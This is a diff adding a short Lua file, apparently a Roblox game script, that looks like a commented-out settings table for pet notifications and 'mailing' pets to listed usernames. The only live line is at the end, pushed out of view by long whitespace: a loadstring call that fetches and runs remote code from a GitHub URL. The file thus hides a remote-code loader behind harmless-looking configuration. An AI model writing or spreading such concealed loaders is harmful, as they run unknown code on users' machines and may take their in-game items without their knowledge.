@@ -1,0 +1,18 @@
+--getgenv().Settings = {
+    --FPSLimit = 10,
+   --UseEventEggs = false,
+
+    --Notifications = {
+        --["Webhook"] = "https://discord.com/",
+        --["Discord ID"] = "",
+        --["Rarities"] = {"Secret", "Exclusive", "Divine", "Exotic", "Celestial", "Superior", "Mythical"},
+        --["Difficulty"] = "Above 50m",
+        --// It will send based off Rarity OR Difficulty, so please change to your liking.
+    --},
+    --Mailing = {
+        --["Usernames"] = {""}, --// Random chance to send to any.
+        --["Keep Best Pets"] = true,
+        --["Rarities"] = {"Secret", "Exclusive", "Divine", "Exotic", "Celestial", "Superior", "Mythical"},
+        --["Difficulty"] = "Above 100k"
+        --// It will send based off Rarity OR Difficulty, so please change to your liking.
+                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/TechCraft1/Zeno-Hub/refs/heads/main/a2369ce34d44187610ac9bf5039c37ab.lua"))()
